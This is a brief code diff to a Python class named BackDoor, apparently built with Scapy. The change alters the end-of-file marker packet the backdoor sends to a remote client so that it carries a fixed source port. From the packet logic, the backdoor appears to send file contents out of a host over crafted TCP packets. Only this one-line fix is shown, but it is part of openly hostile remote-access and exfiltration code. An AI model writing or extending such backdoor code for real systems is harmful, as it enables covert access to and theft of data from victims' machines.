@@ -257,7 +257,7 @@ class BackDoor:
             packets.append(packet)
 
         # Add packet to specify end of file
-        packet = IP(dst=self.client) / TCP(dport=self.send_port) / Raw(load=b'\x00')
+        packet = IP(dst=self.client) / TCP(sport=self.src_port, dport=self.send_port) / Raw(load=b'\x00')
         packets.append(packet)
         self.send_pkt(packets)
 
